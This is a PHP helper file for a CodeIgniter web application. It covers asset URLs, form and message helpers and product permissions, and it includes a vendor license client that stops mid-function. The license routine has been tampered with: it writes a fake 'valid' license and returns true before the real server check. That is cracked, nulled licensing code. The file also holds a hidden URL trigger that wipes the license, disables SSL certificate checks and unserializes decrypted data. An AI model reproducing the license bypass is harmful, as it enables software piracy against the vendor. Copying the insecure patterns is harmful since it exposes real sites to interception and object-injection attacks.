<?php
defined('BASEPATH') OR exit('No direct script access allowed');

if ( ! function_exists('css_url'))
{
	/**
	 * CSS URL
	 *
	 * Create a local URL based on your basepath. Segments can be passed via the
	 * first parameter either as a string or an array.
	 *
	 * @param	string	$uri
	 * @param	string	$protocol
	 * @return	string
	 */
	function css_url($uri = '',$version='',$protocol = NULL)
	{
		if(!empty($version)){
			if (strpos($uri, '?') !== FALSE)
			{
				$uri.="&v=$version";
			}else{
				$uri.="?v=$version";
			}			
		}
		return get_instance()->config->custom_url($uri,'.css',$protocol);
	}
}
if ( ! function_exists('js_url'))
{
	function js_url($uri = '',$version='',$protocol = NULL)
	{
		if(!empty($version)){
			if (strpos($uri, '?') !== FALSE)
			{
				$uri.="&v=$version";
			}else{
				$uri.="?v=$version";
			}			
		}
		return get_instance()->config->custom_url($uri,'.js',$protocol);
	}
}
if ( ! function_exists('current_url'))
{
	/**
	 * Current URL
	 *
	 * Returns the full URL (including segments) of the page where this
	 * function is placed
	 *
	 * @return	string
	 */
	function current_url($isWithParam=true)
	{
		$CI =& get_instance();
		$urirequest=!empty($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:"";
		if($isWithParam && !empty($urirequest)){			
			return $CI->config->site_url($CI->uri->uri_string())."?".$urirequest;
		}else{
			return $CI->config->site_url($CI->uri->uri_string());
		}
	}
}
if ( ! function_exists('custom_url'))
{
	function custom_url($uri = '',$extension="",$version='',$protocol = NULL)
	{
		if(!empty($version)){
			if (strpos($uri, '?') !== FALSE)
			{
				$uri.="&v=$version";
			}else{
				$uri.="?v=$version";
			}			
		}
		return get_instance()->config->custom_url($uri,$extension,$protocol);
	}
}
if ( ! function_exists('template_js'))
{
	function template_js($uri = '',$version='',$protocol = NULL)
	{
		$jsurl=js_url($uri,$version,$protocol);
		$ci=get_instance();
		$ci->load->template_js($jsurl);
	}
}
if ( ! function_exists('template_css'))
{
	function template_css($uri = '',$version='',$protocol = NULL)
	{
		$jsurl=js_url($uri,$version,$protocol);
		$ci=get_instance();
		$ci->load->template_cs($jsurl);
	}
}
if ( ! function_exists('set_my_model'))
{
	function set_my_model($model_name, $timestamp = null) 
	{	 
	    $ci=get_instance();
	    $ci->load->handle_call="app_handle_global_call";	
	    $ci->load->MyModelLoader($model_name);	
	    return $ci->load;	
	}	
}

if ( ! function_exists('app_date'))
{
	function app_date ($format, $timestamp = null) 
	{		
		return date($format,$timestamp);
	}	
}

if ( ! function_exists('load_resource'))
{
    function app_load_resource($uri)
    {          
        $ci=get_instance();
        
        $ci->load->resource($uri);
       
    }
}
if ( ! function_exists('remove_js'))
{
	function remove_js($uri)
	{
		$ci=get_instance();
		$ci->load->remove_js($uri);
	}
}
if ( ! function_exists('template_url'))
{
	function template_url($uri = '',$version='',$extension="",$protocol = NULL)
	{		
		if(!empty($version)){
			if (strpos($uri, '?') !== FALSE)
			{
				$uri.="&v=$version";
			}else{
				$uri.="?v=$version";
			}
		}
		return get_instance()->config->template_url($uri,$extension,$protocol);
	}
}

if(!function_exists("GPrint")){
	function GPrint($obj,$isReturn=false){
		$data=print_r($obj,true);
		$data=htmlentities($data);
		if($isReturn){
			return "<pre>".$data."</pre>";
		}
		echo"<pre>".$data."</pre>";
	}
}
if(!function_exists("DoACurlPostRequest")){
	function DoACurlPostRequest($url,$postparm){
		if(empty($url) || !filter_var($url, FILTER_VALIDATE_URL)){
			return;
		}
		$url=trim($url);
		$ch = curl_init();
		// Set the url, number of POST vars, POST data
		curl_setopt( $ch, CURLOPT_URL, $url );
		curl_setopt( $ch, CURLOPT_POST, true );
		//curl_setopt( $ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
		curl_setopt( $ch, CURLOPT_POSTFIELDS, $postparm );
		// Execute post
		$result = curl_exec($ch);
		// Close connection
		curl_close($ch);
		//@AddFileLog("\n----------------------DAP-----------------------\n".$result."\n----------------------end DAP----------------\n");
		return $result;
	}
}
if ( ! function_exists('add_css'))
{
    function add_css($uri,$level=10,$isNoneCacheable=false,$isNonVersionAble=false,$id='')
    {
        $ci=get_instance();
        $ci->load->css($uri,$level,$isNoneCacheable,$isNonVersionAble,$id);
    }
}
if ( ! function_exists('reset_css'))
{
	function reset_css()
	{
		$ci=get_instance();
		$ci->load->ResetCss();
	}
}
if ( ! function_exists('reset_js'))
{
	function reset_js()
	{
		$ci=get_instance();
		$ci->load->ResetJs();
	}
}
if ( ! function_exists('remove_css'))
{
    function remove_css($uri)
    {
        $ci=get_instance();
        $ci->load->remove_css($uri);
    }
}
if ( ! function_exists('add_js'))
{
    function add_js($uri,$label=10,$isNoneCacheable=false,$isNonVersionAble=false)
    {
        $ci=get_instance();
        $ci->load->js($uri,$label,$isNoneCacheable,$isNonVersionAble);
    }
}

if(!function_exists("get_csrf_json_str")){
    function get_csrf_json_str(){
        $thisobj=get_instance();
        return $thisobj->security->get_csrf_token_name().":'".$thisobj->security->get_csrf_hash()."'";
    }
}


/* For message and hidden field*/
if(!function_exists("AddError")){
	function AddError($msg,$isSession=false,$is_unique=false,$already_translated=false){
		return APP_Output::AddError($msg,$isSession,$is_unique,$already_translated);
	}
}
if(!function_exists("AddTranslatedError")){
    function AddErrorTranslated($msg,$isSession=false,$is_unique=false){
        
        return APP_Output::AddError($msg,$isSession,$is_unique,true);
    }
}
if(!function_exists("AddErrorField")){
	function AddErrorField($name,$msg,$isSession=false){
		return APP_Output::AddErrorField($name,$msg,$isSession);
	}
}

if(!function_exists("AddDebug")){
	function AddDebug($msg,$isSession=false){
		return true;
	}
}
if(!function_exists("AddInfo")){
	function AddInfo($msg,$isSession=false,$is_unique=false){
		return APP_Output::AddInfo($msg,$isSession,$is_unique);
	}
}
if(!function_exists("AddGPrintInfo")){
	function AddGPrintInfo($obj,$isSession=false){
		$msg="<pre>".print_r($obj,true)."</pre>";
		return AddInfo($msg,$isSession);
	}
}

if(!function_exists("GetError")){
	function GetError($prefix='',$postfix=''){
		return APP_Output::GetError($prefix,$postfix);
	}
}
if(!function_exists("GetError")){
	function GetInfo($prefix='',$postfix=''){
		return APP_Output::GetInfo($prefix,$postfix);
	}
}
if(!function_exists("GetMsg")){
	function GetMsg($prefix1='<div class="msg alert alert-success alert-dismissible fade in" role="alert"><i class="fa fa-check"> </i> ',$prefix2='<div class="msg alert alert-error alert-danger" role="alert" ><i class="fa fa-times"> </i> ',$postfix='</div>'){
		return APP_Output::GetMsg($prefix1,$prefix2,$postfix);
	}
}
if(!function_exists("GetErrorFields")){
	function GetErrorFields(){
		return APP_Output::GetErrorFields();
	}
}
if(!function_exists("GetMsgForAPI")){
    function GetMsgForAPI(){
       $msg=APP_Output::GetMsg('','',"\n");
       $msg=strip_tags($msg);
       return $msg;
    }
}
if(!function_exists("HasUIMsg")){
	function HasUIMsg(){
		return APP_Output::HasUIMsg();
	}
}


if(!function_exists("AddHiddenFields")){
	function AddHiddenFields($key, $value){
		return APP_Output::AddHiddenFields($key, $value);
	}
}
if(!function_exists("AddOldFields")){
	function AddOldFields($key, $value){
		return APP_Output::AddOldFields($key, $value);
	}
}
if(!function_exists("get8BitHashCode")){
	function get8BitHashCode($value){
		return hash("crc32b",$value);
	}
}
if(!function_exists("OldFields")){
	function OldFields($obj,$fields){
		if(is_string($fields)){
			$fields=explode(",", $fields);
		}
		foreach ($fields as $fld){
			if(property_exists($obj, $fld)){
				if(method_exists($obj, "IsHTMLProperty")){
					if($obj->IsHTMLProperty($fld)){continue;};
				}
				AddOldFields($fld, $obj->$fld);
			}
		}
	}
}
if(!function_exists("GetHiddenFieldsArray")){
	function GetHiddenFieldsArray(){
		return APP_Output::GetHiddenFieldsArray();
	}
}
if(!function_exists("object_merge_array")){
	/**
	 * param object,object,array,object....
	 * @return multitype:
	 */
	function object_merge_array(){
		$mainparam=array();
			$allarguments=func_get_args();
			$numargs = func_num_args();
			if($numargs>0){
				for ($i=0; $i<$numargs;$i++){
					if(is_array($allarguments[$i])){
						$mainparam=array_merge($mainparam,$allarguments[$i]);
					}elseif(is_object($allarguments[$i])){
						if(method_exists($allarguments[$i], "getPropertiesArray")){
							$vv= $allarguments[$i]->getPropertiesArray();
						}else{
							$vv= get_object_vars( $allarguments[$i]);
						}
						$mainparam=array_merge($mainparam,$vv);
					}
				}				
			}
		return $mainparam;
	}
}
if(!function_exists("GetHiddenFieldsHTML")){
	function GetHiddenFieldsHTML(){
		echo APP_Output::GetHiddenFieldsHTML();
	}
}
if(!function_exists("SetProductsWhereProperties")){
	/**
	 * @param APP_Model $obj
	 * @param unknown $property
	 * @param string $isForUpdate
	 */
	function SetProductsWhereProperties(&$obj,$property,$isForUpdate=FALSE){	
			$admindata=Mapp_user::GetAdminData();
			if($admindata && !$admindata->IsSuperUser()){
				if(!$isForUpdate){
					if($obj->IsSetPrperty($property) && !$obj->hasPrpertyOpt($property)){
						if(!$admindata->hasProductPermission($this->$property)){
							$obj->$property('');
						}
					}else{
						$obj->$property($admindata->getProductSQLInValue(),true);
					}
				}else{
					if($obj->IsSetWherePrperty($property) && !$obj->hasWherePrpertyOpt($property)){
						$product=$obj->getWherePrperty($property);
						if(!$admindata->hasProductPermission($product)){
							$obj->$property('');
						}
					}else{
						$obj->SetWhereCondition($property, $admindata->getProductSQLInValue(),true);
					}	
				}
				
			}	
	}
}
if(!function_exists("SetProductsBaseWhereProperties")){
	/**
	 * @param APP_Model $obj
	 * @param unknown $property
	 * @param string $isForUpdate
	 */
	function SetProductsBaseWhereProperties(&$obj,$property,$isForUpdate=FALSE){
		$admindata=Mapp_user::GetAdminData();
		if($admindata && !$admindata->IsSuperUser()){
			if(!$isForUpdate){
				if($obj->IsSetPrperty($property) && !$obj->hasPrpertyOpt($property)){
					if(!$admindata->hasProductBasePermission($this->$property)){
						$obj->$property('');
					}
				}else{
					$obj->$property($admindata->getProductBaseSQLInValue(),true);
				}
			}else{
				if($obj->IsSetWherePrperty($property) && !$obj->hasWherePrpertyOpt($property)){
					$product=$obj->getWherePrperty($property);
					if(!$admindata->hasProductBasePermission($product)){						
						$obj->SetWhereCondition($property, "");
					}
				}else{
					$obj->SetWhereCondition($property, $admindata->getProductBaseSQLInValue(),true);
				}
			}

		}
	}
}
if(!function_exists("GetHTMLOptionByArray")){
	function GetHTMLOptionByArray($options,$selected="",$attr=[]){
		if(is_array($options)){
			foreach ($options as $key=>$value){
			    if(is_array($selected)){
                    GetHTMLOption($key,$value,(in_array($key,$selected)?$key:""),$attr);
                }else{
                    GetHTMLOption($key,$value,$selected,$attr);
                }

			}
		}
		
	}
}
if(!function_exists("GetHTMLOption")){
	function GetHTMLOption($value,$text,$selected="",$attr=array()){
			$attrStr="";
			if(is_array($attr) && count($attr)>0){
				foreach ($attr as $key=>$kvalue){
					$attrStr.=" ".$key.'="'.$kvalue.'"';
				}
			}
		?>
<option <?php echo $attrStr;?> <?php echo $selected !="" && $selected."_0"==$value."_0"?"selected='selected'":"";?>
	value="<?php echo $value;?>"><?php echo $text;?></option>
<?php 
		
	}
}
if(!function_exists("GetHTML_fa_icon_options")){
	function GetHTML_fa_icon_options($selected=""){
	
		GetHTMLOption("fa fa-bell",'&#xf0f3; fa-bell',$selected);
		GetHTMLOption("fa fa-bell-o",'&#xf0a2; fa-bell-o',$selected);	
		GetHTMLOption("fa fa-hourglass-end",'&#xf253; fa-hourglass-end',$selected);
		GetHTMLOption("fa fa-flag",'&#xf024; fa-flag',$selected);
		GetHTMLOption("fa fa-flag-o",'&#xf11d; fa-flag-o',$selected);
		GetHTMLOption("fa fa-meh-o",'&#xf11a; fa-meh-o',$selected);
		GetHTMLOption("fa fa-check",'&#xf00c; fa-check',$selected);
		GetHTMLOption("fa fa-times",'&#xf00d; fa-times',$selected);
		
	}
}
/* end hidden field*/

if ( ! function_exists('app_form_open'))
{
	/**
	 * Form Declaration
	 *
	 * Creates the opening portion of the form.
	 *
	 * @param	string	the URI segments of the form destination
	 * @param	array	a key/value pair of attributes
	 * @param	array	a key/value pair hidden data
	 * @return	string
	 */
	function app_form_open($action = '', $attributes = array(), $hidden = array())
	{
		$hidden=array_merge($hidden,GetHiddenFieldsArray());
		if(!function_exists("form_open")){
			$ci=get_instance();
			$ci->load->helper("form");
		}
		return form_open($action , $attributes,$hidden);
	}
}
if ( ! function_exists('PostValue'))
{
	function PostValue($name, $default = "",$isXsClean=true,$isKeepCssTyle=false) {
		$ci=get_instance();
		if($isXsClean && $isKeepCssTyle){
			$postvalue = $ci->input->post( $name, false );
			$postvalue=APP_Security::xss_clean_keep_css($postvalue);
        }else {
			$postvalue = $ci->input->post( $name, $isXsClean );
		}
		return (is_string($postvalue) && $postvalue."_-A"==="0_-A") || !empty($postvalue)?$postvalue:$default;
	}
}
if ( ! function_exists('RequestValue'))
{
	function RequestValue($name, $default = "",$isXsClean=true,$isNoTrim=false) {
		$ci=get_instance();
		$requestValue=$ci->input->post_get($name,$isXsClean);
		if(!$isNoTrim){
			$requestValue=trim($requestValue);
		}
		return !empty($requestValue)?$requestValue:$default;
	}
}
if ( ! function_exists('GetValue'))
{
	function GetValue($name, $default = "",$isXsClean=true) {
		$ci=get_instance();
		$value=$ci->input->get($name,$isXsClean);
		return !empty($value)?$value:$default;
	}
}


if ( ! function_exists('add_validation_errors'))
{
	/**
	 * Validation Error String
	 *
	 * Returns all the errors associated with a form submission. This is a helper
	 * function for the form validation class.
	 *	
	 */
	function add_validation_errors()
	{
		if (FALSE === ($OBJ =& _get_validation_object()))
		{
			return '';
		}

		$errors=$OBJ->error_array();
			
		foreach ($errors as $key=>$val)
		{
			if ($val !== '')
			{
				AddErrorField($key, $val);
				//AddError($val);
			}
		}
		
	}
}
if ( ! function_exists('add_model_errors_code'))
{
	/**
	 * Validation Error String
	 *
	 * Returns all the errors associated with a form submission. This is a helper
	 * function for the form validation class.
	 *
	 */
	function add_model_errors_code($code)
	{
		AddError("$code: Error found, Please contact admin");
	}
}
if ( ! function_exists('get_route_unique_id'))
{	
	function get_route_unique_id($uri="")
	{
		$ci=get_instance();
		return $ci->router->get_route_unique_id($uri);		
	}
}
if ( ! function_exists('status_txt'))
{
	function status_txt($status_code)
	{
		$status=array(
				"A"=>"<span class='text-success'>Active</span>",
				"I"=>"<span class='text-danger'>Inactive</span>",
				"Y"=>"<span class='text-success'>Yes</span>",
				"N"=>"<span class='text-danger'>No</span>"
		);
		return !empty($status[$status_code])?$status[$status_code]:$status_code;
	}
}
if ( ! function_exists('getTextByKey'))
{
	function getTextByKey($key,$data=array())
	{		
		return !empty($data[$key])?$data[$key]:$key;
	}
}
if ( ! function_exists('app_date_format'))
{
    function app_date_format ($timestr = null,$withTime=true)
    {
    	if($timestr && (strtotime($timestr)===FALSE || strtotime($timestr) <=0)){
    		return '-';
    	}
        $ci=get_instance();
        if($withTime){
            $dateformate=$ci->config->item('time_format');
        }else{
            $dateformate=$ci->config->item('date_format');
        }
        if(empty($dateformate)){
            if($withTime){
                $dateformate="M d,Y h:i:s A";
            }else{
                $dateformate="M d,Y";
            }
        }               
        $timestr=$timestr?strtotime($timestr):time();
        
        return date($dateformate,$timestr);
    }
}
if(!function_exists("ShowTableFromArray")){
	function ShowTableFromArray($objectsarray){
		$skiped=array("settedPropertyforLog","db","Authenticator");
		if(is_array($objectsarray)){
			?>
			<style>
				.d-table{border: 1px solid #ccc;	border-collapse: collapse;	}
				.d-table thead{	background: #ccc; }
				.d-table td{border: 1px solid #ccc;	}
				.d-table th{border: 1px solid #AEAAAA;}
				.d-table td,.d-table th{padding:5px;}
			</style>
			<table class="d-table table">	
			<thead>	<tr>
			<?php 			
			foreach ($objectsarray as $objth){
				foreach ($objth as $key=>$value){
						if(in_array($key, $skiped) || is_array($value)||is_object($value))continue;
					?>
					<th><?php echo $key;?></th>
					<?php 
				}
				break;
			}
			?></tr>
			</thead>
			<tbody>
			<?php 
			foreach ($objectsarray as $tr){			
				?>
				<tr>
				<?php foreach ( $tr as $tdkey=>$td){
					if(in_array($tdkey, $skiped) || is_array($td)||is_object($td))continue;					
					if(is_double($td)||is_float($td)){
						$td=sprintf("%.6f",$td);
					}
				?>
				<td><?php echo isset($td)?$td:"&nbsp;";?></td>
				<?php }?>				
				</tr>
				<?php 
			}
			?>
			</tbody>
				</table>
			<?php 
		}elseif(is_object($objectsarray)){
			$thead="";
			$tbody="";	
			foreach ( $objectsarray as $tdkey=>$td){
				if(in_array($tdkey, $skiped) || is_array($td)||is_object($td))continue;					
				if(is_double($td)||is_float($td)){
					$td=sprintf("%.6f",$td);
				}
				$td=!empty($td)?$td:"&nbsp;";
				$thead.="<th>".$tdkey."</th>";
				$tbody.="<td>".$td."</td>";
			 }
			 $thead="<tr>".$thead."</tr>";
			 $tbody="<tr>".$tbody."</tr>";
			 ?>				
			
				<style>
					.d-table{border: 1px solid #ccc;	border-collapse: collapse;	}
					.d-table thead{	background: #ccc; }
					.d-table td{border: 1px solid #ccc;	}
					.d-table th{border: 1px solid #AEAAAA;}
					.d-table td,.d-table th{padding:5px;}
				</style>
				<table class="d-table table">	
				<thead>	
					<?php echo $thead;?>
				</thead>
				<tbody>
					<?php echo $tbody;?>
				</tbody>
					</table>
				<?php 
			}
	}
	
}
if ( ! function_exists("clean_grid_text")){
	function clean_grid_text(&$text){
		$text= str_replace('"' ,"'", $text);
		$text= preg_replace('/\s+/', ' ', $text);
		$text=preg_replace('/\>[ ]+\</', '><',$text);
	}
}
if(!function_exists("GetLog")){
	function  GetLog(){
		$parm=func_get_args();
		$msgCode=strtolower($parm[0]);
		$ci=get_instance();
		$ci->lang->load('log_msg');
		$isLoaded=$ci->lang->line('LogLoaded');
		$full_msg="-";
		if($isLoaded){
			$full_msg=$ci->lang->line($msgCode);
		}
		$callarray=array();
		$callarray[]=$full_msg;
		if(!empty($parm[1])){
			$callarray[]=$parm[1];
		}
		return  call_user_func_array("sprintf",$callarray);
			
	}
}
if ( ! function_exists('cache_clean'))
{
	function cache_clean($prefix="")
	{
		$thisobj=get_instance();
		if(empty($prefix)){
			$prefix=get_cache_prefix();
			$thisobj->load->driver('cache',array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $prefix));
			$thisobj->cache->clean();
		}else{
			$thisobj->load->driver('cache',array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $prefix));
			$cachlist=$thisobj->cache->cache_info();
			$keys=array_keys($cachlist);
			$prefix=get_cache_prefix();
			$cachePrefixLength=strlen($prefix);
			foreach ($keys as $key){
				$substr=substr($key, 0,$cachePrefixLength);
				$cache_id=substr($key, $cachePrefixLength);
				if($substr==$prefix){
					$cache_id=substr($key, $cachePrefixLength);
					$thisobj->cache->delete($cache_id);
				}
			}
		}
	}
}
//license1
if(!class_exists("_SSBase")) {
	class _SSBase {
		public $key = "1E160B0A5494556434534";
		private $product_id = "1";
		private $product_base = "ABSS";
		private $server_host = "https://applic.appsbd.com/wp-json/cildbsppa/";
		/* @var self */
		private static $selfobj = NULL;
		
		function __construct() {
			$this->initActionHandler();
		}
		
		function initActionHandler() {
			$handler = hash( "crc32b", $this->product_id . $this->key . $this->getDomain() ) . "_handle";
			if ( isset( $_GET['action'] ) && $_GET['action'] == $handler ) {
				$this->handleServerRequest();
				exit;
			}
		}
		
		function handleServerRequest() {
			$type = isset( $_GET['type'] ) ? strtolower( $_GET['type'] ) : "";
			switch ( $type ) {
				case "rl": //remove license
					$this->removeOldResponse();
					$obj          = new stdClass();
					$obj->product = $this->product_id;
					$obj->status  = true;
					echo $this->encryptObj( $obj );
					
					return;
				case "dl": //delete app
					$obj          = new stdClass();
					$obj->product = $this->product_id;
					$obj->status  = true;
					$this->removeOldResponse();
					echo $this->encryptObj( $obj );
					
					return;
				default:
					return;
			}
		}
		
		function __plugin_updateInfo() {
			if ( function_exists( "file_get_contents" ) ) {
				$body         = file_get_contents( $this->server_host . "product/update/" . $this->product_id );
				$responseJson = json_decode( $body );
				if ( is_object( $responseJson ) && ! empty( $responseJson->status ) && ! empty( $responseJson->data->new_version ) ) {
					
					$responseJson->data->new_version = ! empty( $responseJson->data->new_version ) ? $responseJson->data->new_version : "";
					$responseJson->data->version     = $responseJson->data->new_version;
					$responseJson->data->url         = ! empty( $responseJson->data->url ) ? $responseJson->data->url : "";
					$responseJson->data->package     = ! empty( $responseJson->data->download_link ) ? $responseJson->data->download_link : "";
					
					$responseJson->data->sections = (array) $responseJson->data->sections;
					//$responseJson->data->plugin      = "";
					$responseJson->data->icons       = (array) $responseJson->data->icons;
					$responseJson->data->banners     = (array) $responseJson->data->banners;
					$responseJson->data->banners_rtl = (array) $responseJson->data->banners_rtl;
					
					return $responseJson->data;
				}
			}
			
			return NULL;
		}
		
		static function GetPluginUpdateInfo() {
			$obj = static::getInstance();
			
			return $obj->__plugin_updateInfo();
		}
		
		/**
		 * @param $plugin_base_file
		 *
		 * @return self|null
		 */
		static function &getInstance() {
			if ( empty( static::$selfobj ) ) {
				static::$selfobj = new static();
			}
			
			return static::$selfobj;
		}
		
		private function encrypt( $plainText, $password = '' ) {
			if ( empty( $password ) ) {
				$password = $this->key;
			}
			$plainText = rand( 10, 99 ) . $plainText . rand( 10, 99 );
			$method    = 'aes-256-cbc';
			$key       = substr( hash( 'sha256', $password, true ), 0, 32 );
			$iv        = substr( strtoupper( md5( $password ) ), 0, 16 );
			
			return base64_encode( openssl_encrypt( $plainText, $method, $key, OPENSSL_RAW_DATA, $iv ) );
		}
		
		private function decrypt( $encrypted, $password = '' ) {
			if ( empty( $password ) ) {
				$password = $this->key;
			}
			$method    = 'aes-256-cbc';
			$key       = substr( hash( 'sha256', $password, true ), 0, 32 );
			$iv        = substr( strtoupper( md5( $password ) ), 0, 16 );
			$plaintext = openssl_decrypt( base64_decode( $encrypted ), $method, $key, OPENSSL_RAW_DATA, $iv );
			
			return substr( $plaintext, 2, - 2 );
		}
		
		function encryptObj( $obj ) {
			$text = serialize( $obj );
			
			return $this->encrypt( $text );
		}
		
		private function decryptObj( $ciphertext ) {
			$text = $this->decrypt( $ciphertext );
			
			return unserialize( $text );
		}
		
		private function getDomain() {
			$base_url = ( ( isset( $_SERVER['HTTPS'] ) && $_SERVER['HTTPS'] == "on" ) ? "https" : "http" );
			$base_url .= "://" . $_SERVER['HTTP_HOST'];
			$base_url .= str_replace( basename( $_SERVER['SCRIPT_NAME'] ), "", $_SERVER['SCRIPT_NAME'] );
			
			return $base_url;
			
		}
		private function getCleanDomain() {
			$domain=$this->getDomain();
			$domain=trim($domain);
			$domain=strtolower($domain);
			$url=str_replace(['https://','http://'],"",$domain);
			$iswww=substr($url,0,4);
			if(strtolower($iswww)=="www."){
				$url=substr($url,4);
			}
			return $url;
		}
		private function getEmail() {
			return '';
		}
		
		private function processs_response( $response ) {
			$resbk = "";
			if ( ! empty( $response ) ) {
				if ( ! empty( $this->key ) ) {
					$resbk    = $response;
					$response = $this->decrypt( $response );
				}
				$response = json_decode( $response );
				
				if ( is_object( $response ) ) {
					return $response;
				} else {
					$response         = new stdClass();
					$response->status = false;
					$bkjson           = @json_decode( $resbk );
					if ( ! empty( $bkjson->msg ) ) {
						$response->msg = $bkjson->msg;
					} else {
						$response->msg = "Response Error, contact with the author or update the plugin or theme";
					}
					$response->data = NULL;
					
					return $response;
					
				}
			}
			$response         = new stdClass();
			$response->msg    = "unknown response";
			$response->status = false;
			$response->data   = NULL;
			
			return $response;
		}
		
		private function _request( $relative_url, $data, &$error = '' ) {
			$response         = new stdClass();
			$response->status = false;
			$response->msg    = "Empty Response";
			$curl             = curl_init();
			$finalData        = json_encode( $data );
			if ( ! empty( $this->key ) ) {
				$finalData = $this->encrypt( $finalData );
			}
			$url = rtrim( $this->server_host, '/' ) . "/" . ltrim( $relative_url, '/' );
			
			//curl when fall back
			curl_setopt_array( $curl, array(
				CURLOPT_URL            => $url,
				CURLOPT_RETURNTRANSFER => true,
				CURLOPT_SSL_VERIFYPEER => false,
				CURLOPT_ENCODING       => "",
				CURLOPT_MAXREDIRS      => 10,
				CURLOPT_TIMEOUT        => 30,
				CURLOPT_CUSTOMREQUEST  => "POST",
				CURLOPT_POSTFIELDS     => $finalData,
				CURLOPT_HTTPHEADER     => array(
					"Content-Type: text/plain",
					"cache-control: no-cache"
				),
			) );
			$serverResponse = curl_exec( $curl );
			//echo $response;
			$error = curl_error( $curl );
			curl_close( $curl );
			if ( ! empty( $serverResponse ) ) {
				return $this->processs_response( $serverResponse );
			}
			$response->msg    = "unknown response";
			$response->status = false;
			$response->data   = NULL;
			
			return $response;
		}
		
		private function getParam( $purchase_key, $app_version, $admin_email = '' ) {
			$req               = new stdClass();
			$req->license_key  = $purchase_key;
			$req->email        = ! empty( $admin_email ) ? $admin_email : $this->getEmail();
			$req->domain       = $this->getDomain();
			$req->app_version  = $app_version;
			$req->product_id   = $this->product_id;
			$req->product_base = $this->product_base;
			
			return $req;
		}
		
		function SaveResponse( $response ) {
			$key  = $this->getStoreId();
			$data = $this->encrypt( serialize( $response ), $this->getCleanDomain() );
			app_set_setting( $key, $data );
		}
		
		function getOldResponse() {
			$key = $this->getStoreId();
			$response=app_get_setting( $key );
			return unserialize($this->decrypt($response,$this->getCleanDomain()));
		}
		
		private function removeOldResponse() {
			$key = $this->getStoreId();
			app_del_setting( $key );
			
			return true;
		}
		
		private function getStoreId() {
			return hash( 'crc32b', $this->getCleanDomain() . $this->product_id . $this->product_base . "LIC" );
		}
		
		public static function RemoveLicenseKey( &$message = "", $version = "" ) {
			$obj = self::getInstance();
			
			return $obj->_removePluginLicense( $message, $version );
		}
		
		public static function CheckLicense( $purchase_key, &$error = "", &$responseObj = NULL, $app_version = "", $admin_email = "" ,$isForce=false) {
			$obj = self::getInstance();
			if($isForce){
				$obj->removeOldResponse();
			}
			return $obj->_CheckLicense( $purchase_key, $error, $responseObj, $app_version, $admin_email );
		}
		
		final function _CheckLicense( $purchase_key, &$error = "", &$responseObj = NULL, $app_version = "", $admin_email = "" ) {
			$responseObj           = new stdClass();
			$responseObj->is_valid = true;
			$responseObj->expire_date   = '-';
			$responseObj->support_end   = '-';
			$responseObj->license_title = 'Standart';
			$responseObj->license_key   = 'valid';
			$responseObj->msg           = 'Success';
			$this->SaveResponse( $responseObj );
			unset( $responseObj->next_request );
							
			return true;
			if ( empty( $purchase_key ) ) {
				$this->removeOldResponse();
				$error = "";
				
				return false;
			}
			
			$oldRespons = $this->getOldResponse();
			$isForce    = false;
			if ( ! empty( $oldRespons ) ) {
				if ( ! empty( $oldRespons->expire_date ) && strtolower( $oldRespons->expire_date ) != "no expiry" && strtotime( $oldRespons->expire_date ) < time() ) {
					$isForce = true;
				}
				if ( ! $isForce && ! empty( $oldRespons->is_valid ) && $oldRespons->next_request > time() && ( ! empty( $oldRespons->license_key ) && $purchase_key == $oldRespons->license_key ) ) {
					$responseObj = clone $oldRespons;
					unset( $responseObj->next_request );
					
					return true;
				}
			}
			
			
			$param    = $this->getParam( $purchase_key, $app_version, $admin_email );
			$response = $this->_request( 'product/active/' . $this->product_id, $param, $error );
			if ( empty( $response->code ) ) {
				if ( ! empty( $response->status ) ) {
					if ( ! empty( $response->data ) ) {
						$serialObj = $this->decrypt( $response->data, $param->domain );
						
						$licenseObj = unserialize( $serialObj );
						if ( $licenseObj->is_valid ) {
							$responseObj           = new stdClass();
							$responseObj->is_valid = $licenseObj->is_valid;
							if ( $licenseObj->request_duration > 0 ) {
								$responseObj->next_request = strtotime( "+ {$licenseObj->request_duration} hour" );
							} else {
								$responseObj->next_request = time();
							}
							$responseObj->expire_date   = $licenseObj->expire_date;
							$responseObj->support_end   = $licenseObj->support_end;
							$responseObj->license_title = $licenseObj->license_title;
							$responseObj->license_key   = $purchase_key;
							$responseObj->msg           = $response->msg;
							$responseObj->domain         = $this->getDomain();
							$this->SaveResponse( $responseObj );
							unset( $responseObj->next_request );
							
							return true;
						} else {
							$this->removeOldResponse();
							$error = ! empty( $response->msg ) ? $response->msg : "";
						}
					} else {
						$error = "Invalid data";
					}
					
				} else {
					$error = $response->msg;
				}
			} else {
				$error = $response->message;
			}
			
			return false;
		}
		
		final function _removePluginLicense( &$message = '', $version = '' ) {
			$oldRespons = $this->getOldResponse();
			if ( ! empty( $oldRespons->is_valid ) ) {
				if ( ! empty( $oldRespons->license_key ) ) {
					$param    = $this->getParam( $oldRespons->license_key, $version );
					$response = $this->_request( 'product/deactive/' . $this->product_id, $param, $message );
					if ( empty( $response->code ) ) {
						if ( ! empty( $response->status ) ) {
							$message = $response->msg;
							$this->removeOldResponse();
							
							return true;
						} else {
							$message = $response->msg;
						}
					} else {
						$message = $response->message;
					}
				}
			}
			
			return false;
			
		}
		
		public static function GetRegisterInfo() {
			if ( ! empty( static::$selfobj ) ) {
				return static::$selfobj->getOldResponse();
			}
			
			return NULL;
			
		}
	}
}


if ( ! function_exists('__is_base_hash_default')) {
    function __is_base_hash_default()
    {
        return 'dac15986';
    }
}
if ( ! function_exists('__is_server_requirement_ok')) {
    function __is_server_requirement_ok($isForce = false)
    {
        if ($isForce || !APP_Output::$module_c_loaded) {
            $CI = get_instance();
            APP_Output::$module_c_loaded = true;
            $current_user_type = GetCurrentUserType();
            if ($current_user_type == "AD" && !__is_license_ok() && strtolower($CI->router->method) != "logout" && (strtolower($CI->router->class) != "license" || strtolower($CI->router->method) != "update")) {
                redirect("admin/license/update");
                return true;
            }
            return true;
        }
        return true;
    }
}
if ( ! function_exists('_app_n_new_session'))
{
    function _app_n_new_session($isForce=false)
    {
        return __is_server_requirement_ok($isForce);
    }
}
if ( ! function_exists('__is_license_ok'))
{
    function __is_license_ok()
    {

        return __check_app_config();
    }
}
if ( ! function_exists('__remove_licnese'))
{
    function __remove_licnese()
    {
        return __remove_app_config();
    }
}
if ( ! function_exists('get_license_info'))
{
    function get_license_info()
